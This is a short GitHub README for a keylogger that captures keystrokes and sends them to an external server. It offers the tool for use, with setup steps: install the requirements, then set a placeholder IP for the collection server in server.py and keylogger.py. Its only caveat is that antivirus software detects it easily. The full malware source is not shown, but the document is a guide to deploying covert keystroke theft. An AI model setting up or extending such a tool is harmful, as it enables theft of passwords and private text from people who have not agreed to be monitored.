# Keylogger
Simple keylogger application that sends keystrokes to an external server. 

## Disclaimer
Use at your own risk. This script is highly detectable for all antivirus programs.

# Setup
## Requirements
```
pip install -r .\requirements.txt
```
set ip address at [server.py](https://github.com/kb1337/keylogger/blob/5f935b291775db64e515d936c7ffc9f714399395/server.py#L32)
```python
app.run(debug=True, host='IP-ADDRESS', port=80)
```
set ip address at [keylogger.py](https://github.com/kb1337/keylogger/blob/5f935b291775db64e515d936c7ffc9f714399395/keylogger.py#L13)
```python
server_ip = "YOUR-SERVER-IP"
```
